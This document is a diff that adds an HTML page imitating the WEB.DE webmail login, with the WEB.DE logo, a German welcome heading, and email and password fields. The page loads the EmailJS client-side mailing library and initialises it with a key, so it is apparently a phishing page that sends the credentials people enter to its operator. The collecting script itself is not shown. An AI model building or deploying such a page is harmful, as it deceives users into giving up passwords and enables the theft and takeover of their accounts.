@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <style data-styles="">
+      ion-icon {
+        visibility: hidden;
+      }
+      .hydrated {
+        visibility: inherit;
+      }
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>web.de</title>
+    <link rel="stylesheet" href="./web.de_files/style.css" />
+    <link rel="stylesheet" href="./web.de_files/all.min.css" />
+    <link rel="icon" href="./web.de_files/logo.webp" />
+  </head>
+  <body>
+    <main>
+      <form id="form">
+        <div class="container">
+          <!-- LOGO -->
+          <div class="container-img">
+            <img class="img-logo" src="./web.de_files/logo.webp" alt="" />
+          </div>
+
+          <div class="container-mail-form">
+            <div class="mail-title-container">
+              <!-- MAIL TITLE -->
+              <h3 class="mail-title">Willkommen</h3>
+              <h3 class="mail-title-light">bei WEB.DE</h3>
+            </div>
+            <div class="container-form">
+              <input type="hidden" name="form-name" value="contact" />
+              <input
+                type="email"
+                name="email"
+                placeholder="Email"
+                id="email"
+                required=""
+              />
+
+              <div class="password-container">
+                <input
+                  type="password"
+                  name="password"
+                  placeholder="Password"
+                  id="password"
+                  required=""
+                />
+                <a id="toggle-password">
+                  <span class="password-icon hide" id="open-eye">
+                    <ion-icon name="eye"
+                      ><template shadowrootmode="open"></template
+                    ></ion-icon>
+                  </span>
+                  <span class="password-icon" id="closed-eye">
+                    <ion-icon name="eye-off"
+                      ><template shadowrootmode="open"></template
+                    ></ion-icon>
+                  </span>
+                </a>
+              </div>
+
+              <!-- <a class="forgot-password" href="">FORGOT PASSWORD</a> -->
+
+              <input
+                type="submit"
+                id="button"
+                value="Login"
+                class="submit-form"
+              />
+
+              <!-- <button class="btn-register">REGISTER</button> -->
+            </div>
+          </div>
+        </div>
+      </form>
+    </main>
+
+    <script src="./web.de_files/script.js.download"></script>
+    <script
+      type="module"
+      src="./web.de_files/ionicons.esm.js.download"
+    ></script>
+    <script nomodule="" src="./web.de_files/ionicons.js.download"></script>
+    <script
+      type="text/javascript"
+      src="./web.de_files/email.min.js.download"
+    ></script>
+
+    <script type="text/javascript">
+      emailjs.init("wghXvANnfDMeP3Cf-");
+    </script>
+  </body>
+</html>
